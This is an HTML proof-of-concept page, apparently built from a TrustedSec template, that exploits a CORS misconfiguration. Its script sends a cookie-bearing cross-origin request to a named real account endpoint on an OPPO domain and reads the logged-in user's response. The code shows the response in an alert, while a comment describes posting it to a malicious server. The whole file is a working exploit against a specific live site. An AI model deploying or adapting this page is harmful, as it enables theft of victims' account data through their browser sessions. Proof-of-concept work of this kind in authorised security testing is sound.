<html>
	<head>
		<title>TrustedSec CORS POC</title>
	</head>
	<body>
		<h1>TrustedSec CORS POC</h>
		<script>
			var crossoriginget = new XMLHttpRequest();
			//The target site with the bad CORS configuration
			var url = 'https://olss-online.oppo.com/opposrv/account/checkLogin';
			crossoriginget.open('GET', url, true);//POST
			/*  This tells the browser to send the request with cookies;
			    requires “Access-Control-Allow-Credentials = true” in
			    response headers for this.responseText to be readable.  */
			crossoriginget.withCredentials = true;
			crossoriginget.onload = reqListener;
			crossoriginget.send();//.send($datas);
			/*  Once the cross-origin request completes, attempt to read the
			    response text and send it to the malicious server using an
			    HTTP POST request.  */
			function reqListener() {
				alert(String(this.responseText));
			};
		</script>
	</body>
</html>